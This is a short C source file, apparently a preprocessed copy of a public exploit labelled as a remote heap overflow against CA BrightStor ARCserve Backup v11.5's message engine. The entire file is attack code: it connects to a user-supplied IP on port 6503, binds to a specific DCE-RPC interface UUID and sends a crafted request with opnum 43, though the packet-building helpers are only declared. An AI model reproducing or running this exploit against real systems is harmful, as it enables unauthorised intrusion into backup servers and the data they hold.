
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int uuidSave ;


 int exit (int) ;
 int free (unsigned char*) ;
 int lsConnect (char*,unsigned short) ;
 unsigned char* lsDceRpcBind (int,unsigned char*,int,unsigned long*) ;
 unsigned char* lsDceRpcReq (int,int,unsigned char*,int ,int,unsigned long*) ;
 int lsRecv (int) ;
 int lsSend (int,unsigned char*,unsigned long) ;
 int memset (unsigned char*,char,int) ;
 int printf (char*,...) ;
 int strlen (unsigned char*) ;
 int strncpy (unsigned char*,unsigned char*,int ) ;

int
main(int argc, char* argv[]){
 int s;
 unsigned long cnt;
 unsigned char* pkt=((void*)0);
 unsigned char uuidSave[64];



 int opnum=43;
 unsigned short port= 6503;
 unsigned char uuid[]="dc246bf0-7a7a-11ce-9f88-00805fe43838";



 if(argc!=2){
  printf("\n[-] Usage: %s <ip>\n", argv[0]);
  exit(1);
 }

 printf("\n[+] LSsec.com\n");
 printf("\n[+] CA BrightStor ARCserve Backup v11.5 Message Engine Remote Heap Overflow Exploit\n");

 s=lsConnect(argv[1], port);

 memset(uuidSave, '\0', sizeof(uuidSave));
 strncpy(uuidSave, uuid, strlen(uuid));


 pkt=lsDceRpcBind(1, uuid, 1, &cnt);
 lsSend(s, pkt, cnt);
 lsRecv(s);
 free(pkt);


 pkt=lsDceRpcReq(1, opnum, uuidSave, 0, 0x03, &cnt);
 lsSend(s, pkt, cnt);
 lsRecv(s);
 free(pkt);

 return(0);
}
